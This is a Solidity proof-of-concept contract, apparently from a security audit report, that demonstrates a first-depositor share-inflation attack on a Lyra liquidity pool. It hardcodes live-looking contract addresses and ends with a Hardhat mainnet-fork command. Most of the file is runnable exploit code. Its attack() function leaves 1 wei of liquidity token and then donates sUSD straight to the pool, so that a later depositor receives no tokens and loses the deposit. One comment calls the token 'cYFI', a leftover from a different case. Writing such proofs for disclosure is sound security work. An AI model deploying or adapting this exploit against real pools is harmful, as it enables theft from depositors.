pragma solidity =0.8.7;

import "hardhat/console.sol";

interface ILiquidityPool {
    function initiateDeposit(address beneficiary, uint amountQuote) external;

    function initiateWithdraw(address beneficiary, uint amountLiquidityToken) external;
}
interface LiquidityToken {
    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function mint(address account, uint tokenAmount) external;
}
interface WETH {
    function approve(address guy, uint wad) external returns (bool);
    function balanceOf(address owner) external view returns (uint);
    function deposit() external payable;
}


interface IERC20 {
    function totalSupply() external view returns (uint);

    function balanceOf(address owner) external view returns (uint);

    function allowance(address owner, address spender) external view returns (uint);

    function transfer(address to, uint value) external returns (bool);

    function approve(address spender, uint value) external returns (bool);

    function transferFrom(address from, address to, uint value) external returns (bool);
}
interface ISwapRouter {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }
    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);

}
contract LyraPOC {
    //address of sUSD
    IERC20 public constant baseAsset = 
        IERC20(0x8c6f28f2F1A3C87F0f938b96d27520d9751ec8d9);
    
    ILiquidityPool public constant liquidityPool = 
        ILiquidityPool(0x5Db73886c4730dBF3C562ebf8044E19E8C93843e);

    ISwapRouter public constant swapRouter =
        ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);

    LiquidityToken public constant liquidityToken =
        LiquidityToken(0x0d1a91354A387a1e9E8FCD8f576670c4C3b723cA); //a newly deployed cToken with totalSupply = 0  (cYFI in this case)
    WETH public constant WETH9 = 
        WETH(0x4200000000000000000000000000000000000006);
    uint256 X = 1500e18; // arbitrary amount 
    constructor() payable {
        require(msg.value >= 50 ether, "Need eth to buy underlying");
    }

    fallback() external payable {}

    receive() external payable {}

    function init() internal {
        //let's get our hands on some baseAsset token
        //assuming we have some ETH in the contract
        //swap some ETH for baseAsset token
        uint256 amountIn = 10 ether;

        address(WETH9).call{value: 10 ether}("");
        WETH9.approve(address(swapRouter), amountIn);
        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter
        .ExactInputSingleParams({
            tokenIn: 0x4200000000000000000000000000000000000006,// address of WETH()
            tokenOut: 0x8c6f28f2F1A3C87F0f938b96d27520d9751ec8d9,//address of sUSD
            // pool fee 0.3%
            fee: 3000,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: amountIn,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });
        uint amountOut = swapRouter.exactInputSingle(params);
        console.log(amountOut/1 ether);

    }

    function attack() external {
        init();
        require(
            liquidityToken.totalSupply() == 0,
            "attack only possible when totalSupply of liquidityToken zero"
        );

        //approve baseAsset to sUSD to be able to mint liquidityToken
        baseAsset.approve(address(liquidityPool), 10 ether);
      
        liquidityPool.initiateDeposit(address(this), 2 ether); 

        uint256 liquidityTokenBalance = liquidityToken.balanceOf(address(this));
        //now redeem all the sUSD
        uint256 liquidityTokenToRedeem = liquidityTokenBalance - 1 ;
        liquidityPool.initiateWithdraw(address(this), liquidityTokenToRedeem);

        liquidityTokenBalance = liquidityToken.balanceOf(address(this));
        assert(liquidityTokenBalance == 1); //as expected

        //now transfer X baseAsset directly to liquidity contract addres
        //this make 1 wei of Liquidity token  worth ~X baseToken tokens
        //Attacker can make this X as big as they want as they can redeem it with 1 wei
        baseAsset.transfer(address(liquidityPool), X);
    }
    //call afet the attack function 
    function userDeposit() external {
        //some one tries to mint less than Y
        uint256 liquidityTokenBalanceBefore = liquidityToken.balanceOf(address(address(this)));// balance befefore deposit
        uint256 Y = 1000e18;
        baseAsset.approve(address(liquidityPool), Y);
        liquidityPool.initiateDeposit(address(this), Y);
        //here they do not get 0 liquidityToken
        //and they loose all of their undelrying tokens
        require(
            liquidityTokenBalanceBefore == liquidityToken.balanceOf(address(address(this))), // check balance after the deposit and both are same
            "attack was not sucessfull"
        );
    }

}

//npx hardhat node --fork <alchemyKEY> --fork-block-number 12969633. 